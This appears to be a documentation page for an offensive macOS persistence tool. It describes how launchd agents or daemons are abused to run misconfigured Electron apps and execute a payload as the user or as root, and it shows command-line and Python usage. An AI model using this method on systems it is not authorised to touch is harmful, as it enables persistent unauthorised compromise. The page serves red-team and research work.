# launchd Persistence: Electron

### Description

Based off the `LaunchAgent - Current User` and `LaunchDaemon - Library` methods, these methods will create a Launch Agent/Daemon that will execute an Electron application as the current user/root. This method exploits misconfigured Electron applications allowing for arbitrary code execution.

This method allows for usage of CVEs such as CVE-2023-7245, CVE-2023-50975 and CVE-2024-23755.

### Available Method

| Method                       | Requires      | Runs As       |
|:-----------------------------|:--------------|:--------------|
| `LaunchAgent - Electron`     | Standard User | Standard User |
| `LaunchDaemon - Electron`    | Root          | Root          |


### Demo:

#### - LaunchAgent - Electron

::: code-group

```shell [Command Line]
nekrosis --payload /path/to/payload --method "LaunchAgent - Electron"
```

```python [Python API]
from nekrosis import Nekrosis

nekrosis_obj = Nekrosis(
  payload="/path/to/payload",
  custom_method="LaunchAgent - Electron"
)
nekrosis_obj.install()
```

:::

![](/public/macOS%20Persistence%20Methods/LaunchAgent%20-%20Electron.png)

#### - LaunchDaemon - Electron

::: code-group

```shell [Command Line]
nekrosis --payload /path/to/payload --method "LaunchDaemon - Electron"
```

```python [Python API]
from nekrosis import Nekrosis

nekrosis_obj = Nekrosis(
  payload="/path/to/payload",
  custom_method="LaunchDaemon - Electron"
)
nekrosis_obj.install()
```

:::

![](/public/macOS%20Persistence%20Methods/LaunchDaemon%20-%20Electron.png)